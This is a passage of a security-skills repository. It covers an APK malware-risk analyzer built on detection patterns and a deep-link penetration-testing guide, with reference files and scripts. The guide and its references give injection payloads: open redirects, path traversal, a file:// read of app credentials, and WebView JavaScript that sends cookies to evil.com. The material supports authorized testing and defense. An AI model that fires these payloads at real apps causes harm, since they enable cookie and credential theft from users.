    "android.permission.READ_CONTACTS": "Contact harvesting - worm/spyware indicator",
    "android.permission.READ_CALL_LOG": "Call log access - spyware indicator",
    "android.permission.ACCESS_FINE_LOCATION": "Location tracking - stalkerware indicator",
    "android.permission.SYSTEM_ALERT_WINDOW": "Overlay capability - credential stealer indicator",
    "android.permission.BIND_DEVICE_ADMIN": "Device admin - ransomware indicator",
    "android.permission.BIND_ACCESSIBILITY_SERVICE": "Accessibility abuse - overlay attacks",
    "android.permission.REQUEST_INSTALL_PACKAGES": "Silent app installation capability",
    "android.permission.WRITE_EXTERNAL_STORAGE": "External storage write - data staging",
}

MALWARE_CODE_PATTERNS = {
    "dynamic_dex_loading": r"DexClassLoader|InMemoryDexClassLoader|PathClassLoader",
    "reflection": r"java\.lang\.reflect|Method\.invoke|Class\.forName",
    "native_code_loading": r"System\.loadLibrary|System\.load\(",
    "command_execution": r"Runtime\.getRuntime\(\)\.exec|ProcessBuilder",
    "crypto_operations": r"javax\.crypto\.Cipher|javax\.crypto\.spec",
    "base64_encoding": r"android\.util\.Base64|java\.util\.Base64",
    "root_detection": r"\/system\/xbin\/su|\/system\/app\/Superuser|isRooted|RootBeer",
    "emulator_detection": r"Build\.FINGERPRINT.*generic|goldfish|ranchu|sdk_gphone",
    "keylogger": r"AccessibilityService|onAccessibilityEvent|TYPE_VIEW_TEXT_CHANGED",
    "screen_capture": r"MediaProjection|createVirtualDisplay|CAPTURE_SECURE",
}


def compute_hashes(file_path: str) -> dict:
    """Compute file hashes."""
    with open(file_path, "rb") as f:
        data = f.read()
    return {
        "md5": hashlib.md5(data).hexdigest(),
        "sha1": hashlib.sha1(data).hexdigest(),
        "sha256": hashlib.sha256(data).hexdigest(),
        "size": len(data),
    }


def extract_permissions(apk_path: str) -> list:
    """Extract permissions from APK using aapt."""
    try:
        result = subprocess.run(
            ["aapt", "dump", "permissions", apk_path],
            capture_output=True, text=True, timeout=30
        )
        perms = []
        for line in result.stdout.split("\n"):
            if "uses-permission:" in line:
                perm = line.split("name='")[1].split("'")[0] if "name='" in line else line.strip()
                perms.append(perm)
        return perms
    except (subprocess.TimeoutExpired, FileNotFoundError, IndexError):
        return []


def scan_code_patterns(apk_path: str) -> dict:
    """Scan DEX code for malware patterns."""
    findings = {}
    try:
        with zipfile.ZipFile(apk_path, "r") as z:
            for name in z.namelist():
                if name.endswith(".dex"):
                    dex_data = z.read(name).decode("utf-8", errors="replace")
                    for pattern_name, pattern in MALWARE_CODE_PATTERNS.items():
                        matches = re.findall(pattern, dex_data)
                        if matches:
                            findings[pattern_name] = {
                                "count": len(matches),
                                "samples": list(set(matches))[:3],
                            }
    except zipfile.BadZipFile:
        findings["error"] = "Invalid ZIP/APK file"
    return findings


def check_virustotal(sha256: str, api_key: str) -> dict:
    """Query VirusTotal for file reputation."""
    if not requests or not api_key:
        return {"skipped": True}
    try:
        resp = requests.get(
            f"https://www.virustotal.com/api/v3/files/{sha256}",
            headers={"x-apikey": api_key},
            timeout=15
        )
        if resp.status_code == 200:
            data = resp.json().get("data", {}).get("attributes", {})
            stats = data.get("last_analysis_stats", {})
            return {
                "malicious": stats.get("malicious", 0),
                "suspicious": stats.get("suspicious", 0),
                "undetected": stats.get("undetected", 0),
                "total_engines": sum(stats.values()),
                "detection_names": [
                    f"{engine}: {result.get('result')}"
                    for engine, result in data.get("last_analysis_results", {}).items()
                    if result.get("category") == "malicious"
                ][:10],
            }
        return {"status_code": resp.status_code}
    except Exception as e:
        return {"error": str(e)}


def assess_risk(permissions: list, code_patterns: dict, vt_result: dict) -> dict:
    """Calculate overall malware risk assessment."""
    risk_score = 0
    indicators = []

    # Permission-based risk
    dangerous_found = [p for p in permissions if p in DANGEROUS_PERMISSIONS]
    risk_score += len(dangerous_found) * 10

    # High-risk combinations
    perm_set = set(permissions)
    if {"android.permission.READ_SMS", "android.permission.INTERNET"} <= perm_set:
        indicators.append("SMS stealer pattern (READ_SMS + INTERNET)")
        risk_score += 30
    if {"android.permission.CAMERA", "android.permission.RECORD_AUDIO", "android.permission.INTERNET"} <= perm_set:
        indicators.append("Spyware pattern (CAMERA + AUDIO + INTERNET)")
        risk_score += 40
    if "android.permission.BIND_DEVICE_ADMIN" in perm_set:
        indicators.append("Device admin capability (ransomware indicator)")
        risk_score += 25

    # Code pattern risk
    if "dynamic_dex_loading" in code_patterns:
        indicators.append("Dynamic DEX loading detected")
        risk_score += 20
    if "command_execution" in code_patterns:
        indicators.append("Command execution capability")
        risk_score += 15
    if "emulator_detection" in code_patterns:
        indicators.append("Anti-emulator checks (sandbox evasion)")
        risk_score += 15
    if "keylogger" in code_patterns:
        indicators.append("Accessibility service abuse (keylogger)")
        risk_score += 30

    # VirusTotal
    if vt_result.get("malicious", 0) > 0:
        risk_score += min(vt_result["malicious"] * 5, 50)
        indicators.append(f"VirusTotal: {vt_result['malicious']} engines detected as malicious")

    risk_level = "CRITICAL" if risk_score >= 80 else "HIGH" if risk_score >= 50 else "MEDIUM" if risk_score >= 25 else "LOW"

    return {
        "risk_score": min(risk_score, 100),
        "risk_level": risk_level,
        "indicators": indicators,
    }


def main():
    parser = argparse.ArgumentParser(description="Mobile Malware Behavior Analyzer")
    parser.add_argument("--apk", required=True, help="Path to APK file")
    parser.add_argument("--vt-key", help="VirusTotal API key")
    parser.add_argument("--output", default="malware_report.json", help="Output report")
    args = parser.parse_args()

    if not Path(args.apk).exists():
        print(f"[-] File not found: {args.apk}")
        sys.exit(1)

    print("[*] Computing hashes...")
    hashes = compute_hashes(args.apk)

    print("[*] Extracting permissions...")
    permissions = extract_permissions(args.apk)

    print("[*] Scanning code patterns...")
    code_patterns = scan_code_patterns(args.apk)

    print("[*] Checking VirusTotal...")
    vt_result = check_virustotal(hashes["sha256"], args.vt_key)

    print("[*] Assessing risk...")
    risk = assess_risk(permissions, code_patterns, vt_result)

    report = {
        "analysis": {
            "file": args.apk,
            "date": datetime.now().isoformat(),
            "hashes": hashes,
        },
        "permissions": {
            "total": len(permissions),
            "dangerous": {p: DANGEROUS_PERMISSIONS[p] for p in permissions if p in DANGEROUS_PERMISSIONS},
        },
        "code_patterns": code_patterns,
        "virustotal": vt_result,
        "risk_assessment": risk,
    }

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)

    print(f"\n[+] Report saved: {args.output}")
    print(f"[!] Risk Level: {risk['risk_level']} (Score: {risk['risk_score']}/100)")
    for ind in risk["indicators"]:
        print(f"    - {ind}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/exploiting-deeplink-vulnerabilities/SKILL.md =====
---
name: exploiting-deeplink-vulnerabilities
description: 'Tests and exploits deep link (URL scheme and App Link) vulnerabilities
  in Android and iOS mobile applications to identify unauthorized access, data injection,
  intent hijacking, and redirect manipulation. Use when assessing mobile app attack
  surface through custom URI schemes, Android App Links, iOS Universal Links, or intent-based
  navigation. Activates for requests involving deep link security testing, URL scheme
  exploitation, mobile intent abuse, or link hijacking.

  '
domain: cybersecurity
subdomain: mobile-security
author: mahipal
tags:
- mobile-security
- android
- ios
- deep-links
- owasp-mobile
- penetration-testing
version: 1.0.0
license: Apache-2.0
nist_csf:
- PR.PS-01
- PR.AA-05
- ID.RA-01
- DE.CM-09
mitre_attack:
- T1059
- T1056
- T1036
- T1078
- T1055
---
# Exploiting Deep Link Vulnerabilities

## When to Use

Use this skill when:
- Assessing mobile app deep link handling for injection and redirect vulnerabilities
- Testing Android intent filters and iOS URL scheme handlers for unauthorized access
- Evaluating App Links (Android) and Universal Links (iOS) verification
- Testing for link hijacking via competing app registrations

**Do not use** without authorization -- deep link exploitation can trigger unintended actions in target applications.

## Prerequisites

- Android device with ADB or iOS device with Objection/Frida
- APK decompiled with apktool or JADX for AndroidManifest.xml analysis
- Knowledge of target app's registered URL schemes and intent filters
- Drozer for Android intent testing
- Burp Suite for intercepting deep link-triggered API calls

## Workflow

### Step 1: Enumerate Deep Link Entry Points

**Android - Extract from AndroidManifest.xml:**
```bash
# Decompile APK
apktool d target.apk -o decompiled/

# Search for intent filters with deep link schemes
grep -A 10 "android.intent.action.VIEW" decompiled/AndroidManifest.xml

# Look for:
# <data android:scheme="myapp" android:host="action" />
# <data android:scheme="https" android:host="target.com" />
```

**iOS - Extract from Info.plist:**
```bash
# Extract URL schemes
plutil -p Payload/TargetApp.app/Info.plist | grep -A 5 "CFBundleURLSchemes"

# Extract Universal Links (Associated Domains)
plutil -p Payload/TargetApp.app/Info.plist | grep -A 5 "com.apple.developer.associated-domains"
# Check: applinks:target.com

# Verify apple-app-site-association file
curl https://target.com/.well-known/apple-app-site-association
```

### Step 2: Test Deep Link Injection

**Android via ADB:**
```bash
# Basic deep link invocation
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://dashboard?user_id=1337" com.target.app

# Test with injection payloads
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://profile?redirect=https://evil.com" com.target.app

# Test path traversal
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://navigate?path=../../../admin" com.target.app

# Test JavaScript injection (if loaded in WebView)
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://webview?url=javascript:alert(document.cookie)" com.target.app

# Test with extra intent parameters
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://transfer?amount=1000&to=attacker" \
  --es extra_param "injected_value" com.target.app
```

**iOS via Safari or command line:**
```bash
# Trigger URL scheme from Safari
# Navigate to: myapp://dashboard?user_id=1337

# Using Frida to invoke
frida -U -n TargetApp -e '
ObjC.classes.UIApplication.sharedApplication()
  .openURL_(ObjC.classes.NSURL.URLWithString_("myapp://profile?redirect=https://evil.com"));
'
```

### Step 3: Test Link Hijacking

**Android:**
```bash
# Create a malicious app that registers the same URL scheme
# AndroidManifest.xml of attacker app:
# <intent-filter>
#   <action android:name="android.intent.action.VIEW" />
#   <category android:name="android.intent.category.DEFAULT" />
#   <category android:name="android.intent.category.BROWSABLE" />
#   <data android:scheme="myapp" />
# </intent-filter>

# When both apps are installed, Android shows a chooser dialog
# On older Android versions, the first-installed app may handle the link

# Check App Links verification (prevents hijacking)
adb shell pm get-app-links com.target.app
# Status: verified = secure
# Status: undefined = vulnerable to hijacking
```

### Step 4: Test WebView Deep Link Loading

```bash
# If deep links load URLs in WebView, test for:
# 1. Open redirect
adb shell am start -d "myapp://open?url=https://evil.com" com.target.app

# 2. File access
adb shell am start -d "myapp://open?url=file:///data/data/com.target.app/shared_prefs/creds.xml"

# 3. JavaScript execution in WebView
adb shell am start -d "myapp://open?url=javascript:fetch('https://evil.com/steal?cookie='+document.cookie)"
```

### Step 5: Assess Parameter Validation

Test each deep link parameter for:
- SQL injection in parameters that query local databases
- Path traversal in file path parameters
- SSRF in URL parameters that trigger server requests
- Authentication bypass via user_id or session parameters

## Key Concepts

| Term | Definition |
|------|-----------|
| **Custom URL Scheme** | App-registered protocol (myapp://) that routes to specific app handlers when invoked |
| **App Links (Android)** | Verified HTTPS deep links that bypass the chooser dialog and open directly in the verified app |
| **Universal Links (iOS)** | Apple's verified deep linking using apple-app-site-association JSON file on the web domain |
| **Intent Hijacking** | Malicious app intercepting deep links by registering the same URL scheme or intent filter |
| **WebView Bridge** | JavaScript interface exposed to WebView content, potentially accessible via deep link-loaded URLs |

## Tools & Systems

- **ADB**: Android command-line tool for invoking deep links via `am start`
- **Drozer**: Android security framework for testing intent-based attack surface
- **apktool**: APK decompiler for extracting AndroidManifest.xml and intent filter definitions
- **Frida**: Dynamic instrumentation for hooking URL scheme handlers at runtime
- **Burp Suite**: Proxy for intercepting API calls triggered by deep link navigation

## Common Pitfalls

- **App Links verification**: Android App Links with verified domain associations are resistant to hijacking. Check `assetlinks.json` at `https://domain/.well-known/assetlinks.json`.
- **Fragment handling**: Some apps process URL fragments (#) differently than query parameters (?). Test both.
- **Encoding bypass**: URL-encode payloads to bypass client-side input filtering in deep link handlers.
- **Multi-step deep links**: Some deep links require authentication state. Test after login and before login to assess authorization enforcement.

===== END FILE =====


===== FILE: skills/exploiting-deeplink-vulnerabilities/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/exploiting-deeplink-vulnerabilities/assets/template.md =====
# Deep Link Vulnerability Assessment Report

## Target Application
| Field | Value |
|-------|-------|
| Application | [APP_NAME] |
| Package/Bundle ID | [ID] |
| Platform | [Android/iOS] |
| Deep Links Found | [COUNT] |
| Test Date | [DATE] |

## Deep Link Inventory
| Scheme | Host | Path | Activity/Handler | Exported | Browsable |
|--------|------|------|------------------|----------|-----------|
| [SCHEME] | [HOST] | [PATH] | [HANDLER] | [YES/NO] | [YES/NO] |

## Findings
### Finding [N]: [TITLE]
- **Severity**: [LEVEL]
- **Deep Link**: [URL]
- **Issue**: [DESCRIPTION]
- **Evidence**: [COMMAND_AND_OUTPUT]
- **Recommendation**: [REMEDIATION]

## Recommendations
1. [RECOMMENDATION]

===== END FILE =====


===== FILE: skills/exploiting-deeplink-vulnerabilities/references/api-reference.md =====
# API Reference: Deep Link Vulnerability Testing

## Android Deep Links

### AndroidManifest.xml Configuration
```xml
<activity android:name=".DeepLinkActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="myapp" android:host="open"/>
    </intent-filter>
</activity>
```

### ADB Testing
```bash
adb shell am start -W -a android.intent.action.VIEW \
    -d "myapp://open/path?param=value" com.target.app
```

### Intent URI Scheme
```
intent://path#Intent;scheme=myapp;package=com.target.app;end
```

## iOS URL Schemes

### Info.plist Configuration
```xml
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>myapp</string>
        </array>
    </dict>
</array>
```

### Universal Links (apple-app-site-association)
```json
{
  "applinks": {
    "apps": [],
    "details": [{
      "appID": "TEAM_ID.com.example.app",
      "paths": ["/open/*", "/product/*"]
    }]
  }
}
```

## Vulnerability Types

| Type | Risk | Description |
|------|------|-------------|
| Open Redirect | HIGH | Deep link redirects to attacker URL |
| JavaScript Injection | CRITICAL | Code execution in WebView |
| Parameter Theft | HIGH | Token/credential exfiltration |
| Intent Redirect | HIGH | Android intent hijacking |
| Path Traversal | MEDIUM | Access unintended app sections |

## Attack Payloads

### Open Redirect
```
myapp://open?redirect=https://evil.com
myapp://open?url=javascript:alert(document.cookie)
```

### WebView JavaScript
```
myapp://webview?url=javascript:fetch('https://evil.com/'+document.cookie)
```

### Parameter Injection
```
myapp://auth?token=stolen&callback=https://evil.com
```

## Frida — Runtime Deep Link Testing

### Hook URL Handler (Android)
```javascript
Java.perform(function() {
    var Activity = Java.use("android.app.Activity");
    Activity.onNewIntent.implementation = function(intent) {
        console.log("Deep link: " + intent.getData().toString());
        this.onNewIntent(intent);
    };
});
```

### Hook URL Handler (iOS)
```javascript
var handler = ObjC.classes.AppDelegate["- application:openURL:options:"];
Interceptor.attach(handler.implementation, {
    onEnter: function(args) {
        var url = ObjC.Object(args[3]);
        console.log("URL scheme: " + url.toString());
    }
});
```

===== END FILE =====


===== FILE: skills/exploiting-deeplink-vulnerabilities/references/standards.md =====
# Standards Reference: Deep Link Vulnerabilities

## OWASP Mobile Top 10 2024
| ID | Risk | Deep Link Relevance |
|----|------|-------------------|
| M4 | Insufficient Input/Output Validation | Injection via deep link parameters |
| M8 | Security Misconfiguration | Unverified App Links, missing scheme validation |

## OWASP MASVS v2.0 - MASVS-PLATFORM
| Control | Test |
|---------|------|
| MASVS-PLATFORM-1 | App validates deep link parameters before processing |
| MASVS-PLATFORM-2 | App does not expose sensitive functionality via URL schemes |

## CWE Mappings
| CWE | Title | Attack Vector |
|-----|-------|--------------|
| CWE-939 | Improper Authorization in Handler for Custom URL Scheme | Scheme hijacking |
| CWE-940 | Improper Verification of Source in URL Scheme Handler | Missing origin validation |
| CWE-79 | Cross-site Scripting | JavaScript injection via WebView deep links |
| CWE-601 | URL Redirection to Untrusted Site | Open redirect via URL parameter |

===== END FILE =====


===== FILE: skills/exploiting-deeplink-vulnerabilities/references/workflows.md =====
# Workflows: Deep Link Vulnerability Testing

## Workflow 1: Deep Link Assessment
```
[Extract Manifest/Plist] --> [Enumerate schemes] --> [Test each deep link]
                                                          |
                                           +--------------+--------------+
                                           |              |              |
                                    [Parameter injection] [Redirect test] [WebView loading]
                                    [SQL/XSS/Path trav]  [Open redirect]  [JS injection]
                                           |              |              |
                                           +--------------+--------------+
                                                          |
                                                   [Link hijacking test]
                                                   [App Links verification]
                                                   [Report findings]
```

## Decision Matrix
| Scheme Type | Hijacking Risk | Mitigation |
|-------------|---------------|------------|
| Custom (myapp://) | HIGH - any app can register | Validate calling app, use App Links |
| App Links (verified) | LOW - domain verified | Ensure assetlinks.json is correct |
| Universal Links | LOW - domain verified | Ensure AASA file is correct |

===== END FILE =====


===== FILE: skills/exploiting-deeplink-vulnerabilities/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for testing deep link / custom URL scheme vulnerabilities in mobile apps."""

import argparse
import json
import re
import subprocess
from datetime import datetime, timezone


ANDROID_SCHEME_PATTERN = re.compile(
    r'<intent-filter[^>]*>.*?<data\s+android:scheme="([^"]+)".*?</intent-filter>',
    re.DOTALL
)
ANDROID_HOST_PATTERN = re.compile(r'android:host="([^"]+)"')

IOS_SCHEME_PATTERN = re.compile(r'<string>(\w+)</string>\s*</array>\s*<key>CFBundleURLName')
IOS_UNIVERSAL_PATTERN = re.compile(r'"applinks:\s*([\w.-]+)"')


def analyze_android_manifest(manifest_path):
    """Parse AndroidManifest.xml for deep link configurations."""
    findings = []
    try:
        with open(manifest_path, "r", errors="replace") as f:
            content = f.read()
    except FileNotFoundError:
        return findings

    for match in ANDROID_SCHEME_PATTERN.finditer(content):
        block = match.group(0)
        scheme = match.group(1)
        hosts = ANDROID_HOST_PATTERN.findall(block)
        exported = "android:exported=\"true\"" in block or "android:exported" not in block
        findings.append({
            "scheme": scheme,
            "hosts": hosts,
            "exported": exported,
            "block": block[:200],
            "risk": "HIGH" if exported and scheme not in ("https", "http") else "MEDIUM",
        })
    return findings


def analyze_ios_plist(plist_path):
    """Parse iOS Info.plist for URL scheme and universal link configurations."""
    findings = []
    try:
        with open(plist_path, "r", errors="replace") as f:
            content = f.read()
    except FileNotFoundError:
        return findings

    for match in IOS_SCHEME_PATTERN.finditer(content):
        findings.append({
            "type": "custom_url_scheme",
            "scheme": match.group(1),
            "risk": "HIGH",
            "note": "Custom URL schemes lack origin verification",
        })

    for match in IOS_UNIVERSAL_PATTERN.finditer(content):
        findings.append({
            "type": "universal_link",
            "domain": match.group(1),
            "risk": "LOW",
            "note": "Universal links verify domain ownership",
        })
    return findings


def test_deep_link_injection(scheme, host, path, payload):
    """Construct and test a deep link injection payload."""
    test_url = f"{scheme}://{host}{path}{payload}"
    return {
        "test_url": test_url,
        "payload": payload,
        "vectors": [
            "Open redirect via deep link",
            "JavaScript execution in WebView",
            "Parameter injection",
            "Intent redirection (Android)",
        ],
    }


def check_adb_deep_link(package, uri):
    """Test Android deep link via ADB."""
    cmd = ["adb", "shell", "am", "start", "-W",
           "-a", "android.intent.action.VIEW",
           "-d", uri, package]
    try:
        result = subprocess.check_output(cmd, text=True, errors="replace", timeout=15)
        return {"uri": uri, "status": "launched", "output": result[:300]}
    except (subprocess.SubprocessError, FileNotFoundError):
        return {"uri": uri, "status": "failed"}


def main():
    parser = argparse.ArgumentParser(
        description="Test deep link / URL scheme vulnerabilities (authorized testing only)"
    )
    parser.add_argument("--android-manifest", help="Path to AndroidManifest.xml")
    parser.add_argument("--ios-plist", help="Path to Info.plist")
    parser.add_argument("--test-scheme", help="URL scheme to test")
    parser.add_argument("--test-host", help="Host for deep link test")
    parser.add_argument("--output", "-o", help="Output JSON report")
    args = parser.parse_args()

    print("[*] Deep Link Vulnerability Testing Agent")
    report = {"timestamp": datetime.now(timezone.utc).isoformat(), "findings": []}

    if args.android_manifest:
        android = analyze_android_manifest(args.android_manifest)
        report["findings"].extend(android)
        print(f"[*] Android deep links found: {len(android)}")

    if args.ios_plist:
        ios = analyze_ios_plist(args.ios_plist)
        report["findings"].extend(ios)
        print(f"[*] iOS URL schemes found: {len(ios)}")

    if args.test_scheme and args.test_host:
        payloads = [
            "?redirect=https://evil.com",
            "#javascript:alert(1)",
            "?token=stolen&callback=https://evil.com",
            "/../../sensitive-path",
        ]
        for p in payloads:
            result = test_deep_link_injection(args.test_scheme, args.test_host, "/", p)
            report["findings"].append(result)

    report["risk_level"] = "HIGH" if report["findings"] else "LOW"

    if args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2)
        print(f"[*] Report saved to {args.output}")
    else:
        print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/exploiting-deeplink-vulnerabilities/scripts/process.py =====
#!/usr/bin/env python3
"""
Deep Link Vulnerability Scanner

Extracts deep link definitions from AndroidManifest.xml and tests for common vulnerabilities.

Usage:
    python process.py --manifest AndroidManifest.xml [--package com.target.app] [--output report.json]
"""

import argparse
import json
import subprocess
import sys
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path


def extract_deep_links(manifest_path: str) -> list:
    """Extract deep link definitions from AndroidManifest.xml."""
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    ns = {"android": "http://schemas.android.com/apk/res/android"}

    deep_links = []

    for activity in root.findall(".//activity"):
        activity_name = activity.get(f"{{{ns['android']}}}name", "unknown")
        exported = activity.get(f"{{{ns['android']}}}exported", "false")

        for intent_filter in activity.findall("intent-filter"):
            actions = [a.get(f"{{{ns['android']}}}name", "") for a in intent_filter.findall("action")]
            categories = [c.get(f"{{{ns['android']}}}name", "") for c in intent_filter.findall("category")]

            if "android.intent.action.VIEW" not in actions:
                continue

            for data in intent_filter.findall("data"):
                scheme = data.get(f"{{{ns['android']}}}scheme", "")
                host = data.get(f"{{{ns['android']}}}host", "")
                path = data.get(f"{{{ns['android']}}}path", "")
                path_prefix = data.get(f"{{{ns['android']}}}pathPrefix", "")
                path_pattern = data.get(f"{{{ns['android']}}}pathPattern", "")

                if scheme:
                    deep_links.append({
                        "activity": activity_name,
                        "exported": exported,
                        "scheme": scheme,
                        "host": host,
                        "path": path or path_prefix or path_pattern or "/",
                        "browsable": "android.intent.category.BROWSABLE" in categories,
                        "url": f"{scheme}://{host}{path or path_prefix or path_pattern or '/'}",
                    })

    return deep_links


def assess_deep_link_security(deep_links: list) -> list:
    """Assess security of discovered deep links."""
    findings = []

    for link in deep_links:
        issues = []

        # Custom scheme (not https) - hijacking risk
        if link["scheme"] not in ("http", "https"):
            issues.append({
                "issue": "custom_scheme_hijackable",
                "severity": "HIGH",
                "description": f"Custom scheme '{link['scheme']}://' can be registered by any app",
            })

        # Exported activity without specific path
        if link["exported"] == "true" and link["path"] == "/":
            issues.append({
                "issue": "broad_path_matching",
